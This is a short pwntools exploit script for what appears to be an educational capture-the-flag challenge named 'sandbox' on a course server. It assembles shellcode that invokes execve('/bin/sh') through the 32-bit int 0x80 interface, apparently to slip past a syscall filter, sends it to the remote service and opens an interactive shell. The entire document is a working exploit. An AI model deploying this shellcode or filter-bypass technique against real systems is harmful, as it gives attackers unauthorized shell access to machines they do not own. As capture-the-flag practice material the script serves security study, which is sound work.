from pwn import *
# r = process('./sandbox')
r = remote('edu-ctf.zoolab.org', 30202)
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# target: 
sc = asm("""
mov eax, 0xb
xor rcx, rcx
xor rdx, rdx

movabs rbx, 0x68732f6e69622f
push rbx
mov rbx, rsp
int 0x80
""")
print(sc)

assert(len(sc) <= 0x200)
# gdb.attach(r)
r.sendline(sc)
r.interactive()